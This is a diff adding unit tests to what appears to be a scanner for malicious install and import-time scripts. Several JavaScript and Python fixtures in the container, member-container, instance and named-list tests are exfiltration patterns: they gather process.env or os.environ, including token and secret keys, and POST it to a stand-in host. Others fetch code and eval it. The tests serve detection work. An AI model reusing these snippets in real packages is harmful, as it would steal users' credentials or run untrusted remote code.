@@ -318,6 +318,130 @@ class FlowShapesTests(unittest.TestCase):
         self.assertEqual(self.kind(with_client), ("identity", "user or host name"))
 
 
+class ContainerTests(unittest.TestCase):
+    """D-3 (0.1.9): what a script puts into a container, the container holds, on the tree as in the text. The
+    JavaScript tree model knew an array's push and unshift on a name alone, so an install script that put the whole
+    environment into a FormData, a Map or a Set, or Object.assign'ed it into an object, and sent that, had no finding
+    at all: the tree answered, and the text follower (which reads `x.append(…)` and `x.add(…)`) answers only what
+    the tree cannot read. Python's model had them (its COLLECTS). A member's container (`o.list.push(x)`,
+    `this.items.push(x)`) is D-3b's (MemberContainerTests)."""
+
+    SEND = "fetch('https://x.invalid/c', {method: 'POST', body: %s});\n"
+    WHOLE = "sends environment variables over the network (the whole environment)"
+    FILLS = (
+        ("const c = new FormData();\nc.append('e', JSON.stringify(process.env));\n", "c"),
+        ("const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify(Object.fromEntries(c))"),
+        ("const c = new Set();\nc.add(JSON.stringify(process.env));\n", "JSON.stringify([...c])"),
+        ("const c = new URLSearchParams();\nc.append('e', JSON.stringify(process.env));\n", "c.toString()"),
+        ("const c = [];\nc.splice(0, 0, process.env);\n", "JSON.stringify(c)"),
+        ("const c = {};\nObject.assign(c, { e: process.env });\n", "JSON.stringify(c)"),
+        ("const c = {};\nReflect.set(c, 'e', process.env);\n", "JSON.stringify(c)"),
+        ("const c = new Map();\nfunction keep() { c.set('e', process.env); }\nkeep();\n", "JSON.stringify([...c])"),
+    )
+
+    def test_each_container_is_sent(self):
+        for fill, body in self.FILLS:
+            text = fill + self.SEND % body
+            with self.subTest(fill=fill):
+                self.assertEqual(core.install_script_risk(text, lang="js"), [self.WHOLE])
+                reasons, _line = core.import_time_risk(text, lang="js")
+                self.assertEqual(reasons, ["reads credentials or the whole environment and sends data over the network"])
+
+    def test_what_is_not_sent(self):
+        quiet = ("const c = new Map();\nc.set('e', process.env);\n" + self.SEND % "'ok'",
+                 "const h = new Headers();\nh.set('accept', 'application/json');\n"
+                 "fetch('https://x.invalid/c', {method: 'POST', headers: h});\n")
+        for text in quiet:
+            with self.subTest(text=text):
+                self.assertEqual(core.install_script_risk(text, lang="js"), [])
+
+
+class MemberContainerTests(unittest.TestCase):
+    """D-3b (0.1.9): a member's container holds what it is given, apart from the object that holds it, as an
+    assignment to a member of `this` is held: `o.list.push(x)`, `o.m.set(k, x)`, `this.items.push(x)`,
+    `Object.assign(this.opts, …)`. D-3 left them out: put into the object that holds them, what they were given
+    reached every member read of that object, and joined unrelated flows in large bundles (vite's, monaco-editor's
+    loader). The object's other members do not hold it, and neither does the object sent whole (`JSON.stringify(o)`
+    after `o.list.push(x)`, as before)."""
+
+    SEND = ContainerTests.SEND
+    WHOLE = ContainerTests.WHOLE
+    CLASS = ("class C {\n  constructor() { this.items = []; this.opts = {}; this.name = 'x'; }\n  keep() { %s }\n"
+             "  send() { %s }\n}\nconst c = new C();\nc.keep();\nc.send();\n")
+    SENT = (
+        "const o = { list: [] };\no.list.push(process.env);\n" + SEND % "JSON.stringify(o.list)",
+        "const o = { m: new Map() };\no.m.set('e', process.env);\n" + SEND % "JSON.stringify([...o.m])",
+        "const o = { opts: {} };\nObject.assign(o.opts, { e: process.env });\n" + SEND % "JSON.stringify(o.opts)",
+        "const store = { list: [] };\nfunction keep() { store.list.push(process.env); }\nkeep();\n"
+        + SEND % "JSON.stringify(store.list)",
+        CLASS % ("this.items.push(process.env);", SEND % "JSON.stringify(this.items)"),
+        CLASS % ("Object.assign(this.opts, process.env);", SEND % "JSON.stringify(this.opts)"),
+    )
+
+    def test_each_container_is_sent(self):
+        for text in self.SENT:
+            with self.subTest(text=text):
+                self.assertEqual(core.install_script_risk(text, lang="js"), [self.WHOLE])
+                reasons, _line = core.import_time_risk(text, lang="js")
+                self.assertEqual(reasons, ["reads credentials or the whole environment and sends data over the network"])
+
+    def test_the_objects_other_members(self):
+        for text in ("const o = { list: [], name: 'x' };\no.list.push(process.env);\n" + self.SEND % "o.name",
+                     self.CLASS % ("this.items.push(process.env);", self.SEND % "this.name")):
+            with self.subTest(text=text):
+                self.assertEqual(core.install_script_risk(text, lang="js"), [])
+
+
+class InstanceTests(unittest.TestCase):
+    """B-3 (0.1.9): a method reads `this` as the value it is called on, in a class made in several places, whose
+    instances B-1 keeps apart (vite's MagicString). What one method of an instance was given reached nothing another
+    method of that instance did with it (`r.setCode(t); r.run()`, where `run` evals `this.c`): such a class's `this.c`
+    holds nothing a call on an instance gives. Now it reaches it, and no other instance's. A class made once is
+    followed as before."""
+
+    CLASS = "class R {\n  setCode(t) { this.c = t; }\n  go() { this.run(); }\n  run() { eval(this.c); }\n}\n"
+    MADE = "const a = new R();\nconst b = new R();\n"
+    GET = ("const https = require('https');\nhttps.get('https://x.invalid/c', (res) => {\n  let d = '';\n"
+           "  res.on('data', (c) => { d += c; });\n  res.on('end', () => { a.setCode(d); a.RUN(); });\n});\n")
+    RUNS = "runs code it receives over the network"
+
+    def test_what_an_instance_was_given_another_method_runs(self):
+        for call in ("run", "go"):
+            with self.subTest(call):
+                reasons, _line = core.import_time_risk(self.CLASS + self.MADE + self.GET.replace("RUN", call), lang="js")
+                self.assertIn(self.RUNS, reasons)
+
+    def test_another_instance_runs_nothing_it_was_not_given(self):
+        text = self.CLASS + self.MADE + self.GET.replace("a.RUN()", "b.run()")
+        reasons, _line = core.import_time_risk(text, lang="js")
+        self.assertNotIn(self.RUNS, reasons)
+
+
+class NamedListTests(unittest.TestCase):
+    """B-6 (0.1.9): Python's comprehension over the environment reads what the names in its test are given, as the
+    JavaScript model reads a named list. `{k: v for k, v in os.environ.items() if any(p in k for p in PATTERNS)}`
+    with `PATTERNS = ['TOKEN', 'SECRET']` read as a selection, so it had no finding; with the words inline it was the
+    whole environment. A test that selects by named prefixes (vite's `VITE_`) still selects."""
+
+    SEND = "requests.post('https://x.invalid/c', json=env)\n"
+    WHOLE = "sends environment variables over the network (the whole environment)"
+
+    def test_secret_words_in_a_named_list(self):
+        for text in ("import os, requests\nPATTERNS = ['TOKEN', 'SECRET']\n"
+                     "env = {k: v for k, v in os.environ.items() if any(p in k for p in PATTERNS)}\n" + self.SEND,
+                     "import os, requests\nWORDS = ('KEY', 'PASSWORD')\n"
+                     "env = [v for k, v in os.environ.items() if any(w in k.upper() for w in WORDS)]\n" + self.SEND):
+            with self.subTest(text=text):
+                self.assertEqual(core.install_script_risk(text, lang="py"), [self.WHOLE])
+                reasons, _line = core.import_time_risk(text, lang="py")
+                self.assertEqual(reasons, ["reads credentials or the whole environment and sends data over the network"])
+
+    def test_named_prefixes_select(self):
+        text = ("import os, requests\nPREFIXES = ('VITE_', 'APP_')\n"
+                "env = {k: v for k, v in os.environ.items() if k.startswith(PREFIXES)}\n" + self.SEND)
+        self.assertEqual(core.install_script_risk(text, lang="py"), [])
+
+
 class WalletSwapTests(unittest.TestCase):
     """The detection round (0.1.8): a script that puts its own wallet address
     in place of the one its user copies or sends — patterns of two kinds of
@@ -488,6 +612,32 @@ class SelfReadTests(unittest.TestCase):
                 self.assertEqual(core.import_time_risk(text, lang), ([self.OWN], line))
                 self.assertIn(self.OWN, core.install_script_risk(text))
                 self.assertEqual(core.import_time_severity([self.OWN]), "CRITICAL")
+
+    def test_a_usage_text_and_a_program_given_arguments(self):
+        """rumdl 0.2.78 (N-19): its maintainer scripts give argparse their
+        docstring as the usage text and run gh with arguments. The text
+        follower took the module's `args` for a function's parameter of that
+        name and gh's arguments for code run; Python is read on its tree."""
+        rumdl = ('"""Update the used-by table.\n\nRe-verify every repo the table already lists.\n"""\n'
+                 "import argparse, subprocess\n\n"
+                 "def run_gh(args, timeout=60):\n"
+                 '    result = subprocess.run(["gh", *args], capture_output=True, text=True, timeout=timeout)\n'
+                 "    return result.returncode\n\n"
+                 "def main():\n"
+                 '    parser = argparse.ArgumentParser(description=__doc__.split("\\n")[1])\n'
+                 '    parser.add_argument("--repo")\n'
+                 "    args = parser.parse_args()\n"
+                 '    run_gh(["api", f"repos/{args.repo}"])\n')
+        self.assertGreaterEqual(core.runs_own_source_at(rumdl), 0)      # the text follower alone
+        self.assertEqual(core.import_time_risk(rumdl, "py"), ([], None))
+        for text in ("'''Usage: tool <cmd>'''\nfrom docopt import docopt\nimport os\nargs = docopt(__doc__)\n"
+                     "os.system('git ' + args['<cmd>'])\n",
+                     "src = open(__file__).read()\nprint(len(src))\n\ndef f(src):\n    exec(src)\n\nf('print(1)')\n"):
+            with self.subTest(text[:30]):
+                self.assertEqual(core.import_time_risk(text, "py"), ([], None))
+        # what it reads back, run through a function of its own, still counts
+        text = "def run(src):\n    exec(src)\n\nrun(open(__file__).read()[100:])\n"
+        self.assertEqual(core.import_time_risk(text, "py"), ([self.OWN], 2))
 
     def test_code_run_from_a_data_file_shipped_with_it(self):
         for text in ('import os\nexec(open(os.path.join(os.path.dirname(__file__), "logo.png")).read())\n',
